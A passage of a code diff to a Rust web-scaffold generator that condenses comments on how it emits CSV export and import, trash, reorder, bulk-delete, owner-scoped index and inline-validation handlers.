         String::new()
     };
 
-    // #1315: the `CsvSchema` impl and `GET /{plural}/export.csv` download, emitted straight
-    // after the index — and `bulk_delete` — it exports, so an author reading the module
-    // top to bottom meets the schema and then the route that streams it, right where the
-    // list lives. The impl lives here rather than in `src/models/{snake}.rs` on purpose:
-    // the orphan rule is satisfied either way, since the model type is crate-local, and
-    // keeping it beside its only consumer means the whole feature — impl, route, link,
-    // Cargo feature — is gated in one place. Move it to the model module if a second
-    // consumer appears, such as an `import_csv` route or an `autumn data export` task.
+    // The `CsvSchema` impl and `GET /{plural}/export.csv` (#1315), emitted after the index they
+    // export. The impl sits beside its only consumer so the whole feature is gated in one
+    // place; move it to the model module if a second consumer appears.
     let export_csv_fn = if export_enabled {
         let schema_impl = render_csv_schema_impl(pascal_name, all_fields);
-        // AC5: mirror the index's posture exactly. The owner-scoped index is
-        // `#[secured]` and resolves its owner from the same `PolicyContext` the
-        // mutating handlers authorize against; the plain index carries neither.
-        // #2185: one count-free read, so the file comes from one snapshot.
+        // Mirror the index: the owner-scoped one is `#[secured]` and scopes to the
+        // `PolicyContext` owner; the plain one does neither. One count-free read, so the file
+        // comes from one snapshot (#2185).
         let (secured_attr, authz_params, owner_let, rows_call) = if owner_scoped_standard {
             (
                 "#[secured]\n",
@@ -6293,15 +5213,9 @@ mod attachment_read_back_tests {{
         } else {
             format!("{head}\n        repo.{rows_call}.await?;")
         };
-        // Issue #1319's search box swaps results in via htmx WITHOUT pushing a
-        // URL, so the index's query string — and therefore this export's — never
-        // carries the search term, and `ListQuery` has no field for one. Say so
-        // in the emitted docs rather than let the "matches the filtered view"
-        // sentence above quietly overpromise on a searchable scaffold.
-        // Built with `format!`, not spliced as a literal: this fragment names the
-        // resource's own search route, and the OUTER `format!` does not expand
-        // placeholders inside an already-substituted value — a `{plural}` left in
-        // a plain `&str` here would reach the user's source verbatim.
+        // The search box (#1319) swaps results in without pushing a URL, so the export never
+        // sees the search term; the emitted docs say so. Built with `format!`: the outer
+        // `format!` does not expand a `{plural}` inside an already-substituted value.
         let search_note = if search_enabled {
             format!(
                 "///\n\
@@ -6425,14 +5339,11 @@ mod attachment_read_back_tests {{
         String::new()
     };
 
-    // Issue #1393: the CSV import surface — upload form, dry-run preview, commit.
-    // Emitted straight after the export it mirrors, so the two directions of the
-    // same data door read together, and gated on the same predicate: both go
-    // through the one `CsvSchema` impl above.
+    // CSV import (#1393): upload form, dry-run preview, commit. Gated like the export, since
+    // both go through the one `CsvSchema` impl.
     let csv_import_fn = if import_enabled {
-        // The import writes rows, so it authorizes exactly as `create` does:
-        // context-only `authorize_create`, once for the submit. It carries no
-        // `state:` wrapper of its own, so it takes the full extractor pair.
+        // The import writes rows, so it authorizes as `create` does, with `authorize_create`.
+        // It has no `state:` wrapper of its own, so it takes the full extractor pair.
         let (authz_params, authz_call) = if authorize {
             (
                 format!("{authz_params_full},"),
@@ -6443,33 +5354,21 @@ mod attachment_read_back_tests {{
         } else {
             (String::new(), String::new())
         };
-        // The same filter `render_csv_schema_impl` applies when it decides which
-        // cells go through `csv_text_cell`: an at-rest encrypted column is
-        // excluded from the export entirely, so it cannot contribute a guarded
-        // cell. `id` and `created_at` are typed, so they never appear here.
+        // The filter `render_csv_schema_impl` uses for `csv_text_cell`: an encrypted column is
+        // not exported at all.
         let text_columns: Vec<&str> = all_fields
             .iter()
             .filter(|f| !f.is_encrypted() && csv_kind_is_text(f.kind))
             .map(|f| f.name.as_str())
             .collect();
-        // Every boolean column the export writes, with whether a blank cell means false:
-        // true for a non-nullable column, an unchecked checkbox, and false for a nullable
-        // one, where a blank is NULL rather than `false`.
+        // Columns `{Pascal}Form` carries, which the import can set. An `Attachment` is not: a
+        // storage key in a cell is not a file. `Bytea` is: the export writes `\x` + hex and the
+        // form decodes it (#2330).
         //
-        // Exported columns with no field on `{Pascal}Form`, so an import can never set
-        // them: `id` and `created_at`, which the database assigns; an `Attachment`, since
-        // a storage key in a cell is not a file; and any column dropped from the form,
-        // such as a `--default`ed one. Computed as the difference rather than listed by
-        // kind, so it stays right whatever the form's own exclusions become.
-        //
-        // Columns `{Pascal}Form` carries and the import can faithfully set.
-        // `Attachment` is excluded because a storage key in a cell is not a file.
-        // `Bytea` is settable: the export writes `\x` + hex and the form decodes it
-        // (issue #2330).
-        //
-        // Excluded means: named on the upload page as a column the import cannot set,
-        // listed in `CSV_DISCARDED_COLUMNS` so the report says so when a file supplies
-        // one, and absent from `csv_required_columns()` so a file that omits it is accepted.
+        // `ignored_columns` is every exported column the form cannot set (`id`, `created_at`,
+        // attachments, columns dropped from the form). It is computed as a difference so it
+        // tracks the form's exclusions. The upload page names these columns, the report flags
+        // them via `CSV_DISCARDED_COLUMNS`, and `csv_required_columns()` omits them.
         let form_carried: BTreeSet<&str> = fields
             .iter()
             .filter(|f| !f.kind.is_attachment())
@@ -6483,14 +5382,15 @@ mod attachment_read_back_tests {{
                 .map(|f| f.name.as_str()),
         );
         ignored_columns.push("created_at");
-        // The exact complement of `ignored_columns` within `csv_columns()`: every
-        // exported column the form CAN set. Derived from the same `form_carried`
-        // set, so the two lists can never disagree about a column.
+        // The complement of `ignored_columns` within `csv_columns()`, from the same
+        // `form_carried` set so the two lists cannot disagree.
         let settable_columns: Vec<&str> = all_fields
             .iter()
             .filter(|f| !f.is_encrypted() && form_carried.contains(f.name.as_str()))
             .map(|f| f.name.as_str())
             .collect();
+        // Each boolean column, with whether a blank cell means `false`: true when non-nullable
+        // (an unchecked checkbox), false when nullable (a blank is NULL).
         let bool_columns: Vec<(&str, bool)> = all_fields
             .iter()
             .filter(|f| f.kind == FieldKind::Bool && !f.is_encrypted())
@@ -6515,20 +5415,15 @@ mod attachment_read_back_tests {{
         String::new()
     };
 
-    // Issue #1332: the trash view + its Restore/Purge handlers. Emitted straight
-    // after the index (and its bulk/export companions) because the Trash link is
-    // index furniture and the page it opens is the same list, filtered to the
+    // The trash view and its Restore/Purge handlers (#1332): the index list, filtered to the
     // rows `destroy` marked deleted.
     let trash_section = if trash_enabled {
-        // The trash table's own columns, deliberately not the index's:
+        // The trash table's own columns, not the index's:
         //
-        //   * `use_label_maps = false` — a reference column renders the raw foreign key
-        //     rather than the parent's label, so this handler needs no `Db` extractor
-        //     purely to run label loads for a recycle bin;
-        //   * `sortable = false` — this handler extracts no `ListQuery`, since the
-        //     `only_deleted` scope orders `id DESC` and takes no sort, and a sortable
-        //     header would render a link that reloads the identical list while stamping an
-        //     `aria-sort` that never changes.
+        //   * `use_label_maps = false`: references render the raw foreign key, so the handler
+        //     needs no `Db` extractor just for label loads;
+        //   * `sortable = false`: the `only_deleted` scope orders `id DESC` and takes no sort,
+        //     so a sortable header would only reload the same list.
         //
         // Rebound as `mut` so the two trash-only columns can be pushed after it.
         let trash_columns = render_columns_vec(
@@ -6543,12 +5438,9 @@ mod attachment_read_back_tests {{
             labels,
         )
         .replacen("    let columns:", "    let mut columns:", 1);
-        // Restore and Purge act on the row the trash page just listed, so they
-        // record-authorize it exactly as `destroy` does — same `"delete"` action,
-        // same extractor pair. Moving a row into or out of the trash is the same
-        // authority as deleting it, and `Policy::can` fails closed on any action
-        // name it does not know, so inventing a "restore" action here would deny
-        // every request against a hand-written policy.
+        // Restore and Purge authorize with `destroy`'s `"delete"` action: moving a row in or out
+        // of the trash is the same authority, and `Policy::can` fails closed on an unknown
+        // action, so a new "restore" action would deny every request on a hand-written policy.
         let trash_authz_params = if authorize {
             format!("{edit_destroy_authz_params},")
         } else {
@@ -6561,17 +5453,15 @@ mod attachment_read_back_tests {{
         } else {
             String::new()
         };
-        // The guard load both handlers share. It is the one place either handler touches
-        // `deleted_at` directly, and it is not a substitute for the `only_deleted` scope
-        // the list reads through — it is a precondition:
+        // The guard load both handlers share; the row must be in the trash:
         //
-        //   * `purge` is the only hard delete in the generated app, and the repository's
-        //     `purge(id)` deletes whatever row carries that id, trashed or not. Without
-        //     this filter a crafted POST would hard-delete a live row, straight past the
-        //     soft-delete tunnel the feature exists to provide;
-        //   * a row that is not in the trash cannot be restored from it, so both handlers
-        //     answer 404 rather than report success for a no-op;
+        //   * the repository's `purge(id)` deletes whatever row has that id, so without this
+        //     filter a crafted POST would hard-delete a live row;
+        //   * a row not in the trash cannot be restored, so both handlers answer 404;
         //   * the loaded row is what the record policy authorizes against.
+        //
+        // Both handlers then `drop(db)` before the repository call checks out its own
+        // connection: holding two at once stalls a pool of one.
         let trash_guard_load = format!(
             "    let row: {pascal_name} = {plural}::table\n        \
              .{find_expr}\n        \
@@ -6581,26 +5471,14 @@ mod attachment_read_back_tests {{
              .await\n        \
              .map_err(AutumnError::not_found)?;\n"
         );
-        // Release the `Db` extractor's connection before the repository checks
-        // out its own. `Db` acquires eagerly at extraction and holds until
-        // dropped, so keeping it alive across the repository call would make
-        // these handlers hold two connections at once — an unconditional stall
-        // on a pool of one (same reasoning as `bulk_delete`).
         let cp_trash = cp(&format!("/{plural}/trash"));
-        // The soft-delete column's table header, title-cased the same way every
-        // other index column header is (`title_case`), so the trash table reads
-        // like the list it mirrors.
         let deleted_at_header = title_case("deleted_at");
-        // #1349: the trash view's own strings.
+        // The trash view's own strings (#1349).
         //
-        // The two extra `Column`s take `let` bindings, exactly like the `l_col_*` headers
-        // `render_columns_vec` emits: `Column<'a, T>` holds its header as `&'a str` and
-        // both are pushed into a `columns` vec that outlives the statement, so an inline
-        // `&t!(…)` would be a temporary dropped at the end of the `insert`/`push` (E0716).
-        // `confirm_action`'s per-row title and its config are consumed inside one statement
-        // and can stay inline. The bindings are spliced before the `columns` vec, not
-        // after: locals drop in reverse declaration order, so a label declared after the
-        // vec it is borrowed into would be dropped first (E0597).
+        // The two extra `Column` headers need `let` bindings: `Column<'a, T>` borrows its
+        // header, so an inline `&t!(…)` would be a temporary dropped after the
+        // `insert`/`push` (E0716). The bindings go before the `columns` vec, since locals drop
+        // in reverse declaration order (E0597).
         let (deleted_at_header_expr, actions_header_expr, trash_label_binds) = if labels.enabled() {
             (
                 "&l_trash_deleted_at".to_owned(),
@@ -6785,11 +5663,8 @@ pub async fn purge(
         String::new()
     };
 
-    // Issue #1358: the position field's `move_up`/`move_down` no-JS button
-    // targets. Authorized identically to `edit_form`/`update` ("edit" action,
-    // record policy) since moving a row is a content mutation, not a
-    // deletion — reuses `edit_destroy_authz_params`/`authz_edit_call` rather
-    // than inventing a third authorization shape.
+    // The position field's `move_up`/`move_down` handlers (#1358). Moving a row is an edit, so
+    // they authorize with the "edit" action, as `edit_form` and `update` do.
     let reorder_section = if reorder_enabled {
         format!(
             r#"
@@ -6840,21 +5715,11 @@ pub async fn move_down(
         String::new()
     };
 
-    // For non-live paths, generate the data_table columns and call. Both the plain and
-    // sharded index promote displayable `references` columns to render the parent's label
-    // from a per-view label map (#1146, `index_columns_labeled` plus `index_label_loads`):
-    // the sharded index handler already threads a `ShardedDb`, its `{name}_select_options`
-    // loaders are generated with `db_ty` (`ShardedDb`), and the sharded `show` handler
-    // already loads labels through the same connection, so the index reuses that mechanism
-    // rather than falling back to raw ids. Only the `--live` SSE list, a `<ul>` of ids with
-    // no data table, keeps id rendering.
+    // Non-live indexes, sharded included, render a `data_table` that labels `references`
+    // columns from a per-view label map (#1146). The `--live` `<ul>` shows raw ids.
     //
-    // #1126: sort and filter — the `ListQuery` extractor, `repo.list(..)`, and sortable
-    // `data_table` headers — are likewise gated off for the `--live` variants: their `<ul>`
-    // has no column headers to hang sort links on, and the SSE OOB-swap contract owns the
-    // list DOM. The `--live` index keeps the plain `repo.page(&page_req)` call.
-    // `--live-validation` without `--live` renders the normal data_table index, so it does
-    // get sort and filter.
+    // Sort and filter (#1126) are off for `--live`: its `<ul>` has no headers for sort links,
+    // and the SSE swap owns the list DOM. `--live-validation` alone gets the normal table.
     let columns_let = if live {
         String::new()
     } else {
@@ -6875,10 +5740,8 @@ pub async fn move_down(
     } else {
         render_index_reference_label_loads(&display_reference_fields, &reference_displays)
     };
-    // The plain index gains `mut db: Db` only when there is a label map to load
-    // (otherwise an unused extractor); the sharded index always has a
-    // `ShardedDb` (for `from_shard`), promoted to `mut` when it must also run
-    // the loader.
+    // The plain index takes `mut db: Db` only when it has labels to load. The sharded index
+    // always takes a `ShardedDb` for `from_shard`, made `mut` when it also runs the loader.
     let index_db_param = if index_label_loads.is_empty() {
         ""
     } else {
@@ -6904,11 +5767,9 @@ pub async fn move_down(
             labels,
         )
     };
-    // Issue #1312: the shared columns prelude the index AND the search-results
-    // fragment both splice, so a searched list keeps its row checkboxes. The
-    // config is bound BEFORE the columns vec (and the action `String` before
-    // it): the inserted column's cell closure borrows `bulk_cfg`, so `columns`
-    // must be dropped first — declaring it after keeps the borrow well-ordered.
+    // The index and the search fragment share this prelude, so a searched list keeps its row
+    // checkboxes (#1312). `bulk_cfg` is bound before `columns`, whose cell closure borrows it,
+    // so `columns` drops first.
     let index_columns_labeled = if bulk_delete_enabled {
         let with_mut =
             index_columns_labeled.replacen("    let columns:", "    let mut columns:", 1);
@@ -6921,12 +5782,8 @@ pub async fn move_down(
     } else {
         index_columns_labeled
     };
-    // Issue #1358: the position field's no-JS Move up / Move down buttons —
-    // each a tiny CSRF- and submit-token-protected `POST` form, following the
-    // exact pattern the trash view's Restore button uses (`csrf_input` +
-    // `submit_token_input` inside a bare `form method="post"`). Appended
-    // after the bulk-delete checkbox column (if also present) so both
-    // features compose without either one clobbering the other's insert.
+    // The no-JS Move up / Move down forms (#1358). Pushed at the end, after any bulk checkbox
+    // column, so the two features compose.
     let index_columns_labeled = if reorder_enabled {
         let with_mut =
             index_columns_labeled.replacen("    let columns:", "    let mut columns:", 1);
@@ -6948,27 +5805,14 @@ pub async fn move_down(
     } else {
         index_columns_labeled
     };
-    // #1312: the CSRF pair and the one-time submit-token pair (#1360) the index and search
-    // handlers thread into `bulk_actions_form`'s hidden fields, injected after `flash:
-    // Flash,` in the signatures that render the bulk form and empty otherwise. The submit
-    // token matters here for the same reason it does on create and update:
-    // `SubmitTokenLayer` waves a tokenless request straight through, so without it a
-    // double-clicked "Delete selected" runs the whole destructive path — hooks and
-    // dependent deletes included — twice instead of replaying the first response.
+    // The CSRF and submit-token extractors for the bulk-delete (#1312) and Move up/down
+    // (#1358) forms. `SubmitTokenLayer` waves a tokenless request through, so without the
+    // token a double-click would run a destructive or reordering action twice (#1360). Both
+    // forms render all four inputs, so every emitted param is used.
     //
-    // #1349: under `--i18n` the four token extractors collapse into one tuple parameter.
-    // axum implements `FromRequestParts` for tuples, and its `Handler` impls stop at 16
-    // arguments: the owner-scoped `search` handler already declares 13, and
-    // `#[secured]`/`#[get]` inject three more, so adding `locale: Locale` would push it to
-    // 17 and fail with an unreadable elided-tuple trait error. Destructuring in the
-    // pattern keeps every use site in the body spelled as before, and only under the flag
-    // — the plain scaffold's signature stays byte-identical.
-    //
-    // #1358: the Move up/down buttons need the same CSRF and submit-token pair as the
-    // bulk-delete form, since a double-clicked move is exactly the double-submit
-    // `SubmitTokenLayer` guards against, so this gate and the params it emits are shared
-    // between the two features. Reusing the identical 4-tuple, rather than a 2-tuple for
-    // reorder-only, means every emitted param is always used by at least one of the forms.
+    // Under `--i18n` the four collapse into one tuple parameter (#1349): axum's `Handler`
+    // impls stop at 16 arguments, and `locale: Locale` would push the owner-scoped `search`
+    // handler (13 declared, 3 injected by `#[secured]`/`#[get]`) to 17.
     let bulk_csrf_params = if !bulk_delete_enabled && !reorder_enabled {
         String::new()
     } else if labels.enabled() {
@@ -6980,24 +5824,17 @@ pub async fn move_down(
          submit_token: Option<SubmitToken>,\n    submit_field: Option<SubmitFormField>,"
             .to_owned()
     };
-    // The `Option<&str>` conversions `bulk_actions_form` takes for its hidden
-    // CSRF and submit-token inputs, matching the `csrf_input` /
-    // `submit_token_input` helpers' field-name defaults.
+    // The `Option<&str>` values `bulk_actions_form` takes for its hidden CSRF and
+    // submit-token inputs.
     let bulk_csrf_args = "csrf.as_ref().map(|t| t.token()), csrf_field.as_ref().map(|f| f.0.as_str()), \
          submit_token.as_ref().map(|t| t.token()), submit_field.as_ref().map(|f| f.0.as_str())";
-    // #1126: the data_table config is wired symmetrically with what the server
-    // applies — `.query(..)` preserves the current filters on sort links,
-    // `.active_sort`/`.active_dir` mark the column the repository ordered by, and
-    // `repo.list(&list_query, ..)` applies exactly that sort/filter. Sortable
-    // headers are opted-in per column by `render_columns_vec`.
+    // The table config matches what `repo.list(&list_query, ..)` applies (#1126): `.query(..)`
+    // keeps the filters on sort links, and `.active_sort`/`.active_dir` mark the sort column.
     let table_render = if live {
         String::new()
     } else if owner_scoped_index && !owner_scoped_standard {
-        // #1830 owner-scoped `--sharded`/`--live-validation` index: the handler
-        // runs a manual owner-filtered query (not a scoped repo method) and does
-        // not extract `ListQuery`, so its data_table stays on the plain
-        // (non-sort/filter) config. Wiring owner-scoped sort/filter there is a
-        // follow-up (issue #1841 covers the standard Db path only).
+        // The owner-scoped `--sharded`/`--live-validation` index (#1830) runs a manual
+        // owner-filtered query and extracts no `ListQuery`, so it has no sort/filter.
         format!(
             r"(autumn_web::widgets::data_table(&page_data.content, &columns, &autumn_web::widgets::DataTableConfig::new({index_empty}).base_path(&paths::index())))"
         )
@@ -7008,22 +5845,8 @@ pub async fn move_down(
     };
 
     let list_render = if live { &live_ul_render } else { &table_render };
-    // The list and pager block the index handler renders. When searchable (AC3) this
-    // becomes an `active_search_input` box wired to `GET /{plural}/search`, sitting above
-    // the single `#{plural}-search-results` container htmx swaps into. It uses the
-    // input-only `active_search_input`, not the composite `active_search`, which would
-    // render its own empty `#{plural}-search-results` container and duplicate the id, and
-    // renders one container here seeded with the initial `{list_render}` and pager
-    // server-side — so the first paint needs no extra AJAX round-trip, no
-    // `.initial_load()`, and non-JavaScript visitors still see the full list. The shared
-    // `crate::layout` does not load htmx, so an htmx `<script>` is inlined here. When not
-    // searchable, or on a live variant, it is exactly the previous `{list_render}` and
-    // `pagination_nav` pair, byte for byte (AC4).
-    //
-    // #1126: the non-live index handlers preserve the active sort and filter query string
-    // on the pager links via `PagerOptions::query`, so paging never drops them
-    // (`pager_query` is bound in each handler from the raw query string). The `--live`
-    // variants call `repo.page` and extract no `RawQuery`, so they keep the plain pager.
+    // The non-live pager keeps the active sort and filter on its links via
+    // `PagerOptions::query` (#1126). The `--live` variants extract no `RawQuery`.
     let pager_line = if live {
         format!("(pagination_nav(&page_data, &PagerOptions::new(&paths::index()){pager_labels}))")
     } else {
@@ -7031,32 +5854,14 @@ pub async fn move_down(
             "(pagination_nav(&page_data, &PagerOptions::new(&paths::index()).query(pager_query){pager_labels}))"
         )
     };
-    // #1315: the index's "Export CSV" link, and the `let` that builds its href. The link
-    // carries the index's current query string, so "filter → sort → export" downloads
-    // exactly the rows on screen rather than the whole table; `pager_query` is the same
-    // raw query the pager links already preserve. Paging params ride along harmlessly,
-    // since the export handler extracts no `PageRequest`. Both are empty for a gated-off
-    // variant, so its index stays byte-identical to its pre-#1315 output. Rendered
-    // deliberately outside the #1312 bulk-actions `<form>`: a nested `<form>` is invalid
-    // HTML, and an export is not a selection action.
+    // The index's "Export CSV" link (#1315). Its href carries the index's query string, so the
+    // export matches the sorted, filtered rows on screen. It stays outside the bulk-actions
+    // `<form>`: an export is not a selection action.
     //
-    // Where it sits depends on `--searchable`, because the link must never outlive the row
-    // set it describes:
-    //
-    //   * Not searchable — page furniture next to "New {pascal_name}". The only things
-    //     that narrow the list are `?sort=` and `?filter[col]=`, both in the URL that
-    //     `pager_query` copies into the href, so a link rendered once with the page stays
-    //     accurate as long as the page does.
-    //
-    //   * Searchable — inside the `#{plural}-search-results` container instead.
-    //     `active_search_input` swaps that container and pushes no URL, so the search term
-    //     never reaches `pager_query` and `ListQuery` has no field for it. A link left
-    //     outside the container would survive the swap pointing at the unsearched set: the
-    //     user narrows the list, clicks "Export CSV" next to the rows they filtered down
-    //     to, and silently downloads the rows they just excluded. Rendering it inside means
-    //     the swap replaces it — the search fragment emits no link, so searched results
-    //     offer no export, which the generators guide already documents. Clearing the
-    //     search restores the list and its link.
+    // Without `--searchable` it is page furniture next to "New …". With it, the link goes
+    // inside the `#{plural}-search-results` container: the search swaps results without
+    // pushing a URL, so a link outside would survive the swap and export the unsearched rows.
+    // Inside, the swap replaces it, and searched results offer no export.
     let (export_href_let, export_link) = if export_enabled {
         (
             "    let export_href = if pager_query.is_empty() {\n        \
@@ -7064,10 +5869,8 @@ pub async fn move_down(
              } else {\n        \
              format!(\"{}?{}\", paths::export_csv(), pager_query)\n    \
              };\n",
-            // The explicit `" "` matters: Maud drops template whitespace between
-            // nodes, so without it the two anchors render as one glued run
-            // ("New PostExport CSV"). Same separator the generated `show` view
-            // puts between its "Back to list" and "Edit" links.
+            // The explicit `" "` matters: Maud drops whitespace between nodes, so the anchors
+            // would render as one run ("New PostExport CSV").
             format!(
                 "\n        \" \"\n        \
                  (autumn_web::a11y::Link::new(export_href, {export_csv_text}))"
@@ -7076,29 +5879,15 @@ pub async fn move_down(
     } else {
         ("", String::new())
     };
-    // The furniture slot takes the link only when there is no search box to
-    // invalidate it; otherwise `index_list_block` places it inside the container.
-    // The two slots differ only in indentation — furniture is a direct child of
-    // the `html! {` block (8 spaces), the in-results copy is one level deeper
-    // inside the container `div` (12) — so the generated file stays readable.
+    // Without a search box the link is furniture; otherwise `index_list_block` places it in
+    // the results container. The two copies differ only in indentation (8 vs 12 spaces).
     let export_link_furniture = if search_enabled {
         ""
     } else {
         export_link.as_str()
     };
-    // #1332 AC2: the index's "Trash" link. Page furniture next to "New {pascal_name}":
-    // unlike "Export CSV" it describes no row set, so a search that swaps the results
-    // container cannot leave it pointing at stale rows, and it stays outside the #1312
-    // bulk-actions `<form>`, since a trash page is not a selection action. The explicit
-    // `" "` separator is the same one the export link and the show view use, because Maud
-    // drops template whitespace between nodes and the anchors would otherwise render as
-    // one glued run.
-    //
-    // #1393: the index's "Import CSV" link. Page furniture like "Trash", not like "Export
-    // CSV": it opens an upload form rather than describing the row set on screen, so a
-    // search that swaps the results container cannot leave it pointing at rows the user has
-    // filtered away, which is why it stays in the furniture slot even on a searchable
-    // scaffold. Outside the bulk-actions `<form>` for the same reason the export is.
+    // The "Import CSV" (#1393) and "Trash" (#1332) links describe no row set, so a search swap
+    // cannot make them stale: they stay page furniture even on a searchable scaffold.
     let import_link_furniture = if import_enabled {
         format!(
             "\n        \" \"\n        \
@@ -7125,25 +5914,17 @@ pub async fn move_down(
     } else {
         String::new()
     };
-    // #1312: the list itself — data_table plus pager — is wrapped in the bulk-actions
-    // `<form>`, so each row's checkbox submits with the delete-selected button. The "New
-    // {pascal_name}" link, the htmx `<script>`, and the search box deliberately stay
-    // outside: they are page furniture, not part of the selection.
+    // The list and pager sit inside the bulk-actions `<form>` (#1312), so each checkbox
+    // submits with the delete button. The "New …" link, htmx script and search box stay out.
     //
-    // When searchable, the form sits inside the `#{plural}-search-results` container htmx
-    // swaps, not around it. The `/search` fragment is itself a whole `bulk_actions_form`,
-    // so swapping it into a container that already lived inside a form would nest one
-    // `<form>` in another, which the parser silently drops. Form-inside-container means
-    // every swap replaces the form wholesale and the checkboxes always have their submit
-    // button.
+    // When searchable, the form goes inside the `#{plural}-search-results` container, not
+    // around it: the `/search` fragment is itself a whole form, and the parser drops a form
+    // nested in a form. The container is seeded server-side, so the first paint needs no extra
+    // request and works without JavaScript. The search box is the input-only
+    // `active_search_input`: `active_search` would render a second container with the same id.
+    // The shared layout does not load htmx, so its `<script>` is inlined.
     let index_list_block = if search_enabled {
-        // `export_link_in_results` is the "Export CSV" anchor (empty unless this
-        // variant emits an export). It goes inside the swapped container but
-        // outside the bulk-actions `<form>` — an `<a>` nested in a `<form>` is
-        // legal, but the export is not a selection action and #1312 kept it out
-        // on purpose. Indentation matches the container's other children; the
-        // leading `" "` separator inside the fragment is harmless here, where the
-        // link opens the run rather than following the "New …" anchor.
+        // The export link goes inside the swapped container but outside the bulk form.
         let inner = if bulk_delete_enabled {
             format!(
                 "div id=\"{plural}-search-results\" {{\n            \
@@ -7171,28 +5952,19 @@ pub async fn move_down(
     };
     let show_rows = render_show_property_rows(all_fields, &reference_displays, labels);
     let show_prop_binds = render_show_property_label_binds(all_fields, snake_name, labels);
-    // The `show` handler pre-loads each displayable reference's parent label
-    // (issue #1146) before building its property rows.
     let show_label_loads = render_show_reference_label_loads(all_fields, &reference_displays);
 
-    // Issue #1830: the owner-scoped index runs a manual owner-filtered query on
-    // whichever connection the variant threads — `ShardedDb` (pinned to the
-    // current shard, exactly like the generated `show`/`create` handlers) when
-    // `--sharded`, `Db` otherwise. Both deref (`&mut *db`) to a diesel-async
-    // connection the count/load queries run against.
+    // The owner-scoped index's manual query runs on a `ShardedDb` pinned to the current shard
+    // when `--sharded` (#1830).
     let owner_index_db_param = if sharded {
         "mut db: ShardedDb"
     } else {
         "mut db: Db"
     };
     let index_handler = if owner_scoped_standard {
-        // Issue #1841: standard owner-scoped index. Delegates to the macro's
-        // owner-filtered `list_scoped(owner_id, &list_query, &page_req)` — the
-        // SECURITY INVARIANT is that this branch NEVER calls the unscoped
-        // `repo.list`/`repo.page`, so the allowlisted sort/filter and (when
-        // searchable) the search box can be exposed while every row stays scoped
-        // to the current user. `owner_id` is resolved from the same
-        // `PolicyContext` the mutating handlers authorize against.
+        // Standard owner-scoped index (#1841). Security invariant: this branch calls only
+        // `list_scoped(owner_id, ..)`, never the unscoped `repo.list`/`repo.page`, so sort,
+        // filter and search stay scoped to the current user.
         format!(
             r#"/// `GET /{plural}` — paginated, sortable, filterable list of the {snake_name}s
 /// the current user owns.
@@ -7229,14 +6001,10 @@ pub async fn index(
 }}"#
         )
     } else if owner_scoped_index {
-        // Issue #1125/#1830: owner-scoped index for the `--sharded`/`--live`/
-        // `--live-validation` variants (whose repositories carry no `owner =`
-        // attr, so no scoped repo method exists). Pagination is preserved by
-        // running a `COUNT(*)` + `LIMIT/OFFSET` query filtered to the current
-        // user's rows, then wrapping the result in `Page::new`. `{list_render}`
-        // keeps the `--live` SSE `<ul>` island (a data_table for the non-live
-        // variants), so the SSE broadcast contract is unaffected — only the
-        // *initial* server-rendered list is owner-scoped.
+        // Owner-scoped index for `--sharded`/`--live`/`--live-validation` (#1125, #1830):
+        // their repositories have no `owner =` attr, so there is no scoped method. A
+        // filtered `COUNT(*)` + `LIMIT/OFFSET` query feeds `Page::new`. Only the initial
+        // server-rendered list is owner-scoped; the `--live` SSE broadcast is unchanged.
         format!(
             r#"/// `GET /{plural}` — paginated list of {snake_name}s the current user owns.
 ///
@@ -7381,10 +6149,8 @@ pub async fn index(
         )
     };
 
-    // #1126: the non-live index handlers extract `ListQuery` (allowlisted
-    // sort/filter) and the raw query string (`RawQuery`, to preserve filters on
-    // the data_table sort links). The pure `--live` index keeps `repo.page` and
-    // needs neither — omit the imports there to avoid unused-import warnings.
+    // `ListQuery` and `RawQuery` are extracted only by the non-live index handlers; the
+    // `--live` index would leave these imports unused (#1126).
     let sort_imports = if live {
         String::new()
     } else {
@@ -7393,9 +6159,7 @@ pub async fn index(
             .to_owned()
     };
 
-    // Imports: when sharded, drop Db from brace-import and add ShardedDb separately.
-    // The stream handler uses the fully-qualified axum path so no extra IntoResponse
-    // import is needed.
+    // The stream handler uses the fully-qualified axum path, so no `IntoResponse` import.
     let db_import = if sharded {
         "use autumn_web::flash::{Flash, flash_messages};\n\
          use autumn_web::form::{Changeset, IntoChangeset};\n\
@@ -7409,14 +6173,10 @@ pub async fn index(
             .to_owned()
     };
 
-    // Schema imports: the resource's own table, plus each referenced table so
-    // its rows can be loaded — for the form select options AND for the
-    // index/show parent-display label loads (issue #1146), which is why this
-    // uses the display-scoped set (populated even in `--live-validation`, where
-    // the form select is skipped but the display loads remain). Only present
-    // targets reach here (`missing_reference_targets` excluded): importing a
-    // table whose `diesel::table!` entry doesn't exist would fail to compile,
-    // and a missing target has always been a warning, not an error.
+    // The resource's table plus each referenced table, for the form selects and the index/show
+    // label loads (#1146), hence the display-scoped set: `--live-validation` skips the selects
+    // but keeps the label loads. Missing targets are already excluded:
+    // importing a table with no `diesel::table!` entry would not compile.
     let schema_import = {
         let mut extra_tables: BTreeSet<String> = display_reference_fields
             .iter()
@@ -7434,18 +6194,12 @@ pub async fn index(
         }
     };
 
-    // When `--live-validation`, emit one inline-validation handler per validated field.
-    // Each decodes the whole submitted form — htmx's `hx-include="closest form"` posts
-    // every field, not just the one that changed — via the same `decode_form` that
-    // `create` and `update` use, builds a `Changeset<{pascal_name}Form>` through the
-    // struct's derived `#[validate(...)]` rules, and returns `text_input_htmx`'s full
-    // field wrapper (label, input, inline error) for that one field. Sharing the changeset
-    // and validator machinery with `create`/`update` keeps the validation rules in one
-    // place, and the returned markup matches `text_input_htmx`'s `hx-swap="outerHTML"`
-    // contract — swapping in a bare `<span>` would delete the input it is meant to
-    // replace. Rich-text columns are excluded (#1255); see the matching filter on
-    // `validated_field_names` in `plan_scaffold`. Both sides must agree or the mounted
-    // route set and the emitted handler set drift apart.
+    // One inline-validation handler per validated field. Each decodes the whole form (htmx's
+    // `hx-include="closest form"` posts every field) with `create`'s `decode_form`, so the
+    // `#[validate(...)]` rules live in one place, and returns the field's full wrapper: the
+    // swap is `outerHTML`, so a bare `<span>` would delete the input. Rich-text columns are
+    // excluded (#1255); this filter must match `validated_field_names` in `plan_scaffold`, or
+    // the mounted routes and the emitted handlers drift apart.
     let htmx_validated: Vec<(&String, &Vec<String>)> = validations
         .iter()
         .filter(|(name, _)| {
@@ -7461,17 +6215,12 @@ pub async fn index(
             let rule_comment = rules.join(", ");
             let label = humanize_label(field_name);
             let field = fields.iter().find(|f| f.name == **field_name);
-            // Issue #1750: a DSL-constrained `String`/`Text` field renders in
